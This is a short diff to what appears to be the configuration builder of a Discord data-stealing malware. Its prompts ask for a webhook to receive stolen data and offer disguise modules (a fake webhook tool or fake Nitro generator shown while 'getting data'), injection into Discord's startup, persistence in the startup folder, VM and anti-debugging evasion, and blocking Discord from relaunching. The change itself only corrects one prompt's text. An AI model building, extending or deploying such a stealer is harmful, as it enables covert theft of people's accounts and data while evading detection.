@@ -26,7 +26,7 @@ while True:
     Webhook = input('Enter the webhook -> ')
     FakeWeb = get_boolean_input('Do you want to enable Fake Webhook Module (When the file is launched it will show a Webhook Tools while getting data) Y/N: ')
     FakeGen = get_boolean_input('Do you want to enable Fake Generator Module (When the file is launched it will show a nitro generator while getting data) Y/N: ')
-    Injection = get_boolean_input('Do you want to enable Fake Generator Module (When the file is launched it will show a nitro generator while getting data) Y/N: ')
+    Injection = get_boolean_input('Do you want to inject the script to discord Startup Y/N: ')
     Startup = get_boolean_input('Do you want to add the file to the startup folder? Y/N: ')
     No_Debug = get_boolean_input('Do you want to enable VM Checker and Anti Debugging Y/N: ')
     Close = get_boolean_input('Do you want to prevent Discord from being launched again? Y/N: ')
